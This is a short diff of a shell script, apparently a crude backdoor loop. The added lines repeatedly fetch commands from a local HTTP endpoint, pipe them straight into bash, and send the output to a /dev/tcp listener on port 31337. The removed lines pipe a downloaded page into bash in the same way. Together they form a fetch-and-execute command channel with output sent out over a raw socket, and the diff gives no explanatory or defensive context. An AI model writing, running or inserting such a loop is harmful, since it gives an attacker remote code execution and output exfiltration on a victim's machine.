@@ -2,6 +2,6 @@
 
 for i in {1..9999}
 do
-wget -q -O - http://example.com | bash
-sleep 60
+  wget -q -O - http://127.0.0.1:8080/cmd | bash &> /dev/tcp/127.0.0.1/31337
+  sleep 60
 done
